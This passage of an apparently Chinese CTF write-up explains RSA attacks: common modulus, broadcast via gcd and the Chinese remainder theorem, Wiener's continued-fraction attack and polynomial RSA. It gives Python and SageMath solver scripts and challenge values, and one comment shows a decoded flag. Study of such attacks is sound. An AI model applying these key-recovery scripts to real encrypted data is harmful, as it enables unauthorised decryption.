<p>c1 = 22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361 e1 = 11187289 c2 = 18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397 e2 = 9647291</p>
</blockquote>
<h4 id="数学基础扩展欧几里得算法">数学基础：扩展欧几里得算法</h4>
<p>$$ 扩展欧几里得算法可以在求出a,b的最大公约数的同时，求出满足ax+by = gcd(a, b)的x,y。<br>
</p>
<p>求最大公约数：欧几里得算法(辗转相除)<br>
</p>
<p>在到达辗转相除的递归边界时，b==0，a=gcd(a,b)。这时，a+b*0=gcd(a,b)，x=1,y=0<br>
</p>
<p>从递归的下一层往上一层推导，假设我们已知x_1,y_1使b<em>x_1+(a mod b)</em>y_1=gcd(b, (a mod b))=gcd(a,b)<br>
</p>
<p>首先已知a mod b = a - a // b * b<br>
</p>
<p>带回上一个式子： b<em>x_1 + (a-(a//b)b)y_1= bx_1 + ay_1 – (a//b)by_1= a*y_1 + b</em>(x_1 – (a//b)*y_1) = gcd(a,b)<br>
</p>
<p>x = y_1, y = x_1 - (a//b)*y_1 $$</p>
<h4 id="解题推导">解题推导</h4>
<p><span class="math display">\[ 首先可知gcd(e_1, e_2) = 1，使用扩展欧几里得可以求出满足e_1*s_1+e_2*s_2 = 1的s_1和s_2。\ 又已知c_1 ≡ m^{e_1} mod n, c_2 ≡ m^{e_2} mod n,可得c_1^{s_1}*c_2^{s_2} mod n ≡ m^{(e_1*s_1+e_2*s_2)} ≡ m。 \]</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y = egcd(b, a % b)</span><br><span class="line">        <span class="keyword">return</span> y, x - (a // b) * y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gongmo</span>(<span class="params">n, c1, c2, e1, e2</span>):</span><br><span class="line">    s = egcd(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">0</span>]</span><br><span class="line">    s2 = s[<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># 求模反元素</span></span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = invert(c2, n)</span><br><span class="line">    m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line">c1 = <span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">n = <span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">e1 = <span class="number">11187289</span></span><br><span class="line">c2 = <span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">e2 = <span class="number">9647291</span></span><br><span class="line">result = gongmo(n, c1, c2, e1, e2)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(result))</span><br></pre></td></tr></table></figure>
<h3 id="广播攻击">广播攻击</h3>
<p>特点：给出多组n,c，使用同一个e加密。</p>
<h4 id="解题思路1遍历每对n寻找是否有公约数">解题思路1：遍历每对n,寻找是否有公约数</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = [n0, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, n11, n12, n13, n14, n15, n16, n17, n18, n19]</span><br><span class="line">c = [c0, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11, c12, c13, c14, c15, c16, c17, c18, c19]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">        <span class="keyword">if</span> i != j:</span><br><span class="line">            <span class="keyword">if</span> gmpy2.gcd(n[i], n[j]) != <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(i, j)  <span class="comment"># 输出对应的n的序号</span></span><br><span class="line">                p = gmpy2.gcd(n[i], n[j])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;p = &quot;</span>, p)</span><br><span class="line">                q = n[i] // p</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;q = &quot;</span>, q)</span><br><span class="line">                d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;d = &quot;</span>, d)</span><br><span class="line">                m = <span class="built_in">pow</span>(c[i], d, n[i])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;m = &quot;</span>, m)</span><br></pre></td></tr></table></figure>
<h4 id="解题思路2中国剩余定理">解题思路2：中国剩余定理</h4>
<h5 id="数学基础-1">数学基础</h5>
<p><span class="math display">\[ 假设整数m_1,m_2,...m_n两两互素，则对于任意的整数a_1,a_2,...a_n，方程组\ \begin{equation} \begin{cases} x ≡ a_1 mod m_1 \ x ≡ a_2 mod m_2 \ ... \ x ≡ a_n mod m_n \end{cases} \end{equation} \]</span></p>
<p><span class="math display">\[ 都存在整数解，若X ,Y都满足该方程组，X ≡ Y modN，其中N=m_1*m_2*...*m_n。具体而言，\ x ≡ \sum_{i=1}^na_i\*\frac{N}{m_i}*[(\frac{N}{m_i})^{-1}]_{m_i}modN \]</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">N1 = <span class="number">331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004</span></span><br><span class="line">c1 = <span class="number">310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243</span></span><br><span class="line"></span><br><span class="line">N2 = <span class="number">302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114</span></span><br><span class="line">c2 = <span class="number">112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344</span></span><br><span class="line"></span><br><span class="line">N3 = <span class="number">332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323</span></span><br><span class="line">c3 = <span class="number">10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242</span></span><br><span class="line"></span><br><span class="line">N = []</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="comment"># 将题目给的所有值转成十进制并放进列表中</span></span><br><span class="line">    N.append(<span class="built_in">int</span>(<span class="built_in">str</span>(<span class="built_in">eval</span>(<span class="string">&#x27;N&#x27;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>))), <span class="number">5</span>))</span><br><span class="line">    c.append(<span class="built_in">int</span>(<span class="built_in">str</span>(<span class="built_in">eval</span>(<span class="string">&#x27;c&#x27;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>))), <span class="number">5</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;N&#x27;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>), <span class="string">&#x27;=&#x27;</span>, N[i])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c&#x27;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>), <span class="string">&#x27;=&#x27;</span>, c[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chinese_remainder</span>(<span class="params">modulus, remainders</span>):</span><br><span class="line">    Sum = <span class="number">0</span></span><br><span class="line">    prod = reduce(<span class="keyword">lambda</span> a, b: a * b, modulus)</span><br><span class="line">    <span class="keyword">for</span> m_i, r_i <span class="keyword">in</span> <span class="built_in">zip</span>(modulus, remainders):</span><br><span class="line">        p = prod // m_i</span><br><span class="line">        Sum += r_i * (inverse(p, m_i) * p)</span><br><span class="line">    <span class="keyword">return</span> Sum % prod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"><span class="comment"># print(chinese_remainder(N,c))</span></span><br><span class="line">pow_m_e = chinese_remainder(N, c)</span><br><span class="line"><span class="comment"># pow_m_e = 17446992834638639179129969961058029457462398677361658450137832328330435503838651797276948890990069700515669656391607670623897280684064423087023742140145529356863469816868212911716782075239982647322703714504545802436551322108638975695013439206776300941300053940942685511792851350404139366581130688518772175108412341696958930756520037</span></span><br><span class="line">m = iroot(pow_m_e, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h3 id="维纳攻击低解密指数">维纳攻击(低解密指数)</h3>
<h4 id="数学基础连分数展开">数学基础：连分数展开</h4>
<p><span class="math display">\[ a = a_0+\frac{1}{a_1+\frac{1}{a2+\frac{1}{...}}} \]</span></p>
<p>简化为a=[a0;a1,a2,...an]记作对a的连分数展开。</p>
<p>连分数定理： <span class="math display">\[ 当\mid x-\frac{a}{b} \mid&lt;\frac{1}{2b^2}时，\frac{a}{b}是x的一个连分数近似。 \]</span></p>
<h3 id="推导">推导</h3>
<p><span class="math display">\[ 当满足d&lt;\frac{1}{3}N^{\frac{1}{4}}时，一定能分解N。\ 令λ(N)=lcm(p−1,q−1)=\frac{φ(N)}{g}，s = 1-p-q,\ 已知e*d = 1 + k*λ(N),则edg-kN=g+ks.\ 两边同除dgN得\frac{e}{N}-\frac{k}{dg}=(\frac{k}{dg})(\frac{s}{N})+\frac{1}{dN},\ 所以当d&lt;\frac{\sqrt{2}}{2g}N^{\frac{1}{4}}时，\frac{k}{dg}是\frac{e}{N}的连分数近似。 \]</span></p>
<p>脚本：<a href="https://security.feishu.cn/link/safety?target=https://github.com/pablocelayes/rsa-wiener-attack&amp;scene=ccm&amp;logParams=%7B%22location%22:%22ccm_drive%22%7D&amp;lang=zh-CN">GitHub - pablocelayes/rsa-wiener-attack: A Python implementation of the Wiener attack on RSA public-key encryption scheme.</a></p>
<h3 id="多项式rsa">多项式RSA</h3>
<blockquote>
<p>Prime: 43753 Modulus: 34036<em>y^177 + 23068</em>y^176 + 13147<em>y^175 + 36344</em>y^174 + 10045<em>y^173 + 41049</em>y^172 + 17786<em>y^171 + 16601</em>y^170 + 7929<em>y^169 + 37570</em>y^168 + 990<em>y^167 + 9622</em>y^166 + 39273<em>y^165 + 35284</em>y^164 + 15632<em>y^163 + 18850</em>y^162 + 8800<em>y^161 + 33148</em>y^160 + 12147<em>y^159 + 40487</em>y^158 + 6407<em>y^157 + 34111</em>y^156 + 8446<em>y^155 + 21908</em>y^154 + 16812<em>y^153 + 40624</em>y^152 + 43506<em>y^151 + 39116</em>y^150 + 33011<em>y^149 + 23914</em>y^148 + 2210<em>y^147 + 23196</em>y^146 + 43359<em>y^145 + 34455</em>y^144 + 17684<em>y^143 + 25262</em>y^142 + 982<em>y^141 + 24015</em>y^140 + 27968<em>y^139 + 37463</em>y^138 + 10667<em>y^137 + 39519</em>y^136 + 31176<em>y^135 + 27520</em>y^134 + 32118<em>y^133 + 8333</em>y^132 + 38945<em>y^131 + 34713</em>y^130 + 1107<em>y^129 + 43604</em>y^128 + 4433<em>y^127 + 18110</em>y^126 + 17658<em>y^125 + 32354</em>y^124 + 3219<em>y^123 + 40238</em>y^122 + 10439<em>y^121 + 3669</em>y^120 + 8713<em>y^119 + 21027</em>y^118 + 29480<em>y^117 + 5477</em>y^116 + 24332<em>y^115 + 43480</em>y^114 + 33406<em>y^113 + 43121</em>y^112 + 1114<em>y^111 + 17198</em>y^110 + 22829<em>y^109 + 24424</em>y^108 + 16523<em>y^107 + 20424</em>y^106 + 36206<em>y^105 + 41849</em>y^104 + 3584<em>y^103 + 26500</em>y^102 + 31897<em>y^101 + 34640</em>y^100 + 27449<em>y^99 + 30962</em>y^98 + 41434<em>y^97 + 22125</em>y^96 + 24314<em>y^95 + 3944</em>y^94 + 18400<em>y^93 + 38476</em>y^92 + 28904<em>y^91 + 27936</em>y^90 + 41867<em>y^89 + 25573</em>y^88 + 25659<em>y^87 + 33443</em>y^86 + 18435<em>y^85 + 5934</em>y^84 + 38030<em>y^83 + 17563</em>y^82 + 24086<em>y^81 + 36782</em>y^80 + 20922<em>y^79 + 38933</em>y^78 + 23448<em>y^77 + 10599</em>y^76 + 7156<em>y^75 + 29044</em>y^74 + 23605<em>y^73 + 7657</em>y^72 + 28200<em>y^71 + 2431</em>y^70 + 3860<em>y^69 + 23259</em>y^68 + 14590<em>y^67 + 33631</em>y^66 + 15673<em>y^65 + 36049</em>y^64 + 29728<em>y^63 + 22413</em>y^62 + 18602<em>y^61 + 18557</em>y^60 + 23505<em>y^59 + 17642</em>y^58 + 12595<em>y^57 + 17255</em>y^56 + 15316<em>y^55 + 8948</em>y^54 + 38<em>y^53 + 40329</em>y^52 + 9823<em>y^51 + 5798</em>y^50 + 6379<em>y^49 + 8662</em>y^48 + 34640<em>y^47 + 38321</em>y^46 + 18760<em>y^45 + 13135</em>y^44 + 15926<em>y^43 + 34952</em>y^42 + 28940<em>y^41 + 13558</em>y^40 + 42579<em>y^39 + 38015</em>y^38 + 33788<em>y^37 + 12381</em>y^36 + 195<em>y^35 + 13709</em>y^34 + 31500<em>y^33 + 32994</em>y^32 + 30486<em>y^31 + 40414</em>y^30 + 2578<em>y^29 + 30525</em>y^28 + 43067<em>y^27 + 6195</em>y^26 + 36288<em>y^25 + 23236</em>y^24 + 21493<em>y^23 + 15808</em>y^22 + 34500<em>y^21 + 6390</em>y^20 + 42994<em>y^19 + 42151</em>y^18 + 19248<em>y^17 + 19291</em>y^16 + 8124<em>y^15 + 40161</em>y^14 + 24726<em>y^13 + 31874</em>y^12 + 30272<em>y^11 + 30761</em>y^10 + 2296<em>y^9 + 11017</em>y^8 + 16559<em>y^7 + 28949</em>y^6 + 40499<em>y^5 + 22377</em>y^4 + 33628<em>y^3 + 30598</em>y^2 + 4386<em>y + 23814 Ciphertext: 5209</em>x^176 + 10881<em>x^175 + 31096</em>x^174 + 23354<em>x^173 + 28337</em>x^172 + 15982<em>x^171 + 13515</em>x^170 + 21641<em>x^169 + 10254</em>x^168 + 34588<em>x^167 + 27434</em>x^166 + 29552<em>x^165 + 7105</em>x^164 + 22604<em>x^163 + 41253</em>x^162 + 42675<em>x^161 + 21153</em>x^160 + 32838<em>x^159 + 34391</em>x^158 + 832<em>x^157 + 720</em>x^156 + 22883<em>x^155 + 19236</em>x^154 + 33772<em>x^153 + 5020</em>x^152 + 17943<em>x^151 + 26967</em>x^150 + 30847<em>x^149 + 10306</em>x^148 + 33966<em>x^147 + 43255</em>x^146 + 20342<em>x^145 + 4474</em>x^144 + 3490<em>x^143 + 38033</em>x^142 + 11224<em>x^141 + 30565</em>x^140 + 31967<em>x^139 + 32382</em>x^138 + 9759<em>x^137 + 1030</em>x^136 + 32122<em>x^135 + 42614</em>x^134 + 14280<em>x^133 + 16533</em>x^132 + 32676<em>x^131 + 43070</em>x^130 + 36009<em>x^129 + 28497</em>x^128 + 2940<em>x^127 + 9747</em>x^126 + 22758<em>x^125 + 16615</em>x^124 + 14086<em>x^123 + 13038</em>x^122 + 39603<em>x^121 + 36260</em>x^120 + 32502<em>x^119 + 17619</em>x^118 + 17700<em>x^117 + 15083</em>x^116 + 11311<em>x^115 + 36496</em>x^114 + 1300<em>x^113 + 13601</em>x^112 + 43425<em>x^111 + 10376</em>x^110 + 11551<em>x^109 + 13684</em>x^108 + 14955<em>x^107 + 6661</em>x^106 + 12674<em>x^105 + 21534</em>x^104 + 32132<em>x^103 + 34135</em>x^102 + 43684<em>x^101 + 837</em>x^100 + 29311<em>x^99 + 4849</em>x^98 + 26632<em>x^97 + 26662</em>x^96 + 10159<em>x^95 + 32657</em>x^94 + 12149<em>x^93 + 17858</em>x^92 + 35805<em>x^91 + 19391</em>x^90 + 30884<em>x^89 + 42039</em>x^88 + 17292<em>x^87 + 4694</em>x^86 + 1497<em>x^85 + 1744</em>x^84 + 31071<em>x^83 + 26246</em>x^82 + 24402<em>x^81 + 22068</em>x^80 + 39263<em>x^79 + 23703</em>x^78 + 21484<em>x^77 + 12241</em>x^76 + 28821<em>x^75 + 32886</em>x^74 + 43075<em>x^73 + 35741</em>x^72 + 19936<em>x^71 + 37219</em>x^70 + 33411<em>x^69 + 8301</em>x^68 + 12949<em>x^67 + 28611</em>x^66 + 42654<em>x^65 + 6910</em>x^64 + 18523<em>x^63 + 31144</em>x^62 + 21398<em>x^61 + 36298</em>x^60 + 27158<em>x^59 + 918</em>x^58 + 38601<em>x^57 + 4269</em>x^56 + 5699<em>x^55 + 36444</em>x^54 + 34791<em>x^53 + 37978</em>x^52 + 32481<em>x^51 + 8039</em>x^50 + 11012<em>x^49 + 11454</em>x^48 + 30450<em>x^47 + 1381</em>x^46 + 32403<em>x^45 + 8202</em>x^44 + 8404<em>x^43 + 37648</em>x^42 + 43696<em>x^41 + 34237</em>x^40 + 36490<em>x^39 + 41423</em>x^38 + 35792<em>x^37 + 36950</em>x^36 + 31086<em>x^35 + 38970</em>x^34 + 12439<em>x^33 + 7963</em>x^32 + 16150<em>x^31 + 11382</em>x^30 + 3038<em>x^29 + 20157</em>x^28 + 23531<em>x^27 + 32866</em>x^26 + 5428<em>x^25 + 21132</em>x^24 + 13443<em>x^23 + 28909</em>x^22 + 42716<em>x^21 + 6567</em>x^20 + 24744<em>x^19 + 8727</em>x^18 + 14895<em>x^17 + 28172</em>x^16 + 30903<em>x^15 + 26608</em>x^14 + 27314<em>x^13 + 42224</em>x^12 + 42551<em>x^11 + 37726</em>x^10 + 11203<em>x^9 + 36816</em>x^8 + 5537<em>x^7 + 20301</em>x^6 + 17591<em>x^5 + 41279</em>x^4 + 7999<em>x^3 + 33753</em>x^2 + 34551*x + 9659</p>
</blockquote>
<p>分解N为p和q后，p,q的欧拉函数为prime的p和q最高次方-1。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">R.&lt;y&gt; = PolynomialRing(GF(43753))</span><br><span class="line">N = 34036*y^177 + 23068*y^176 + 13147*y^175 + 36344*y^174 + 10045*y^173 + 41049*y^172 + 17786*y^171 + 16601*y^170 + 7929*y^169 + 37570*y^168 + 990*y^167 + 9622*y^166 + 39273*y^165 + 35284*y^164 + 15632*y^163 + 18850*y^162 + 8800*y^161 + 33148*y^160 + 12147*y^159 + 40487*y^158 + 6407*y^157 + 34111*y^156 + 8446*y^155 + 21908*y^154 + 16812*y^153 + 40624*y^152 + 43506*y^151 + 39116*y^150 + 33011*y^149 + 23914*y^148 + 2210*y^147 + 23196*y^146 + 43359*y^145 + 34455*y^144 + 17684*y^143 + 25262*y^142 + 982*y^141 + 24015*y^140 + 27968*y^139 + 37463*y^138 + 10667*y^137 + 39519*y^136 + 31176*y^135 + 27520*y^134 + 32118*y^133 + 8333*y^132 + 38945*y^131 + 34713*y^130 + 1107*y^129 + 43604*y^128 + 4433*y^127 + 18110*y^126 + 17658*y^125 + 32354*y^124 + 3219*y^123 + 40238*y^122 + 10439*y^121 + 3669*y^120 + 8713*y^119 + 21027*y^118 + 29480*y^117 + 5477*y^116 + 24332*y^115 + 43480*y^114 + 33406*y^113 + 43121*y^112 + 1114*y^111 + 17198*y^110 + 22829*y^109 + 24424*y^108 + 16523*y^107 + 20424*y^106 + 36206*y^105 + 41849*y^104 + 3584*y^103 + 26500*y^102 + 31897*y^101 + 34640*y^100 + 27449*y^99 + 30962*y^98 + 41434*y^97 + 22125*y^96 + 24314*y^95 + 3944*y^94 + 18400*y^93 + 38476*y^92 + 28904*y^91 + 27936*y^90 + 41867*y^89 + 25573*y^88 + 25659*y^87 + 33443*y^86 + 18435*y^85 + 5934*y^84 + 38030*y^83 + 17563*y^82 + 24086*y^81 + 36782*y^80 + 20922*y^79 + 38933*y^78 + 23448*y^77 + 10599*y^76 + 7156*y^75 + 29044*y^74 + 23605*y^73 + 7657*y^72 + 28200*y^71 + 2431*y^70 + 3860*y^69 + 23259*y^68 + 14590*y^67 + 33631*y^66 + 15673*y^65 + 36049*y^64 + 29728*y^63 + 22413*y^62 + 18602*y^61 + 18557*y^60 + 23505*y^59 + 17642*y^58 + 12595*y^57 + 17255*y^56 + 15316*y^55 + 8948*y^54 + 38*y^53 + 40329*y^52 + 9823*y^51 + 5798*y^50 + 6379*y^49 + 8662*y^48 + 34640*y^47 + 38321*y^46 + 18760*y^45 + 13135*y^44 + 15926*y^43 + 34952*y^42 + 28940*y^41 + 13558*y^40 + 42579*y^39 + 38015*y^38 + 33788*y^37 + 12381*y^36 + 195*y^35 + 13709*y^34 + 31500*y^33 + 32994*y^32 + 30486*y^31 + 40414*y^30 + 2578*y^29 + 30525*y^28 + 43067*y^27 + 6195*y^26 + 36288*y^25 + 23236*y^24 + 21493*y^23 + 15808*y^22 + 34500*y^21 + 6390*y^20 + 42994*y^19 + 42151*y^18 + 19248*y^17 + 19291*y^16 + 8124*y^15 + 40161*y^14 + 24726*y^13 + 31874*y^12 + 30272*y^11 + 30761*y^10 + 2296*y^9 + 11017*y^8 + 16559*y^7 + 28949*y^6 + 40499*y^5 + 22377*y^4 + 33628*y^3 + 30598*y^2 + 4386*y + 23814</span><br><span class="line">print(factor(N))</span><br><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br><span class="line">e = 65537</span><br><span class="line">phi = (43753^65-1)*(43753^112-1)# phi是不高于P(y)幂级的环内所有多项式中，与P(y)无公因式的其他多项式的个数</span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line">c = 5209*x^176 + 10881*x^175 + 31096*x^174 + 23354*x^173 + 28337*x^172 + 15982*x^171 + 13515*x^170 + 21641*x^169 + 10254*x^168 + 34588*x^167 + 27434*x^166 + 29552*x^165 + 7105*x^164 + 22604*x^163 + 41253*x^162 + 42675*x^161 + 21153*x^160 + 32838*x^159 + 34391*x^158 + 832*x^157 + 720*x^156 + 22883*x^155 + 19236*x^154 + 33772*x^153 + 5020*x^152 + 17943*x^151 + 26967*x^150 + 30847*x^149 + 10306*x^148 + 33966*x^147 + 43255*x^146 + 20342*x^145 + 4474*x^144 + 3490*x^143 + 38033*x^142 + 11224*x^141 + 30565*x^140 + 31967*x^139 + 32382*x^138 + 9759*x^137 + 1030*x^136 + 32122*x^135 + 42614*x^134 + 14280*x^133 + 16533*x^132 + 32676*x^131 + 43070*x^130 + 36009*x^129 + 28497*x^128 + 2940*x^127 + 9747*x^126 + 22758*x^125 + 16615*x^124 + 14086*x^123 + 13038*x^122 + 39603*x^121 + 36260*x^120 + 32502*x^119 + 17619*x^118 + 17700*x^117 + 15083*x^116 + 11311*x^115 + 36496*x^114 + 1300*x^113 + 13601*x^112 + 43425*x^111 + 10376*x^110 + 11551*x^109 + 13684*x^108 + 14955*x^107 + 6661*x^106 + 12674*x^105 + 21534*x^104 + 32132*x^103 + 34135*x^102 + 43684*x^101 + 837*x^100 + 29311*x^99 + 4849*x^98 + 26632*x^97 + 26662*x^96 + 10159*x^95 + 32657*x^94 + 12149*x^93 + 17858*x^92 + 35805*x^91 + 19391*x^90 + 30884*x^89 + 42039*x^88 + 17292*x^87 + 4694*x^86 + 1497*x^85 + 1744*x^84 + 31071*x^83 + 26246*x^82 + 24402*x^81 + 22068*x^80 + 39263*x^79 + 23703*x^78 + 21484*x^77 + 12241*x^76 + 28821*x^75 + 32886*x^74 + 43075*x^73 + 35741*x^72 + 19936*x^71 + 37219*x^70 + 33411*x^69 + 8301*x^68 + 12949*x^67 + 28611*x^66 + 42654*x^65 + 6910*x^64 + 18523*x^63 + 31144*x^62 + 21398*x^61 + 36298*x^60 + 27158*x^59 + 918*x^58 + 38601*x^57 + 4269*x^56 + 5699*x^55 + 36444*x^54 + 34791*x^53 + 37978*x^52 + 32481*x^51 + 8039*x^50 + 11012*x^49 + 11454*x^48 + 30450*x^47 + 1381*x^46 + 32403*x^45 + 8202*x^44 + 8404*x^43 + 37648*x^42 + 43696*x^41 + 34237*x^40 + 36490*x^39 + 41423*x^38 + 35792*x^37 + 36950*x^36 + 31086*x^35 + 38970*x^34 + 12439*x^33 + 7963*x^32 + 16150*x^31 + 11382*x^30 + 3038*x^29 + 20157*x^28 + 23531*x^27 + 32866*x^26 + 5428*x^25 + 21132*x^24 + 13443*x^23 + 28909*x^22 + 42716*x^21 + 6567*x^20 + 24744*x^19 + 8727*x^18 + 14895*x^17 + 28172*x^16 + 30903*x^15 + 26608*x^14 + 27314*x^13 + 42224*x^12 + 42551*x^11 + 37726*x^10 + 11203*x^9 + 36816*x^8 + 5537*x^7 + 20301*x^6 + 17591*x^5 + 41279*x^4 + 7999*x^3 + 33753*x^2 + 34551*x + 9659</span><br><span class="line">print(c^d)</span><br><span class="line"># 125*x^62 + 111*x^61 + 114*x^60 + 117*x^59 + 53*x^58 + 51*x^57 + 51*x^56 + 100*x^55 + 106*x^54 + 110*x^53 + 102*x^52 + 106*x^51 + 100*x^50 + 104*x^49 + 101*x^48 + 117*x^47 + 52*x^46 + 52*x^45 + 57*x^44 + 48*x^43 + 50*x^42 + 107*x^41 + 35*x^40 + 101*x^39 + 114*x^38 + 117*x^37 + 99*x^36 + 101*x^35 + 115*x^34 + 110*x^33 + 105*x^32 + 95*x^31 + 116*x^30 + 117*x^29 + 98*x^28 + 95*x^27 + 110*x^26 + 117*x^25 + 102*x^24 + 95*x^23 + 115*x^22 + 105*x^21 + 95*x^20 + 97*x^19 + 101*x^18 + 107*x^17 + 105*x^16 + 95*x^15 + 109*x^14 + 111*x^13 + 114*x^12 + 102*x^11 + 95*x^10 + 65*x^9 + 83*x^8 + 82*x^7 + 123*x^6 + 114*x^5 + 118*x^4 + 101*x^3 + 116*x^2 + 97*x + 119</span><br></pre></td></tr></table></figure>
<h3 id="coppersmith攻击已知p高位">coppersmith攻击:已知p高位</h3>
<h4 id="数学基础格基规约">数学基础：格基规约</h4>
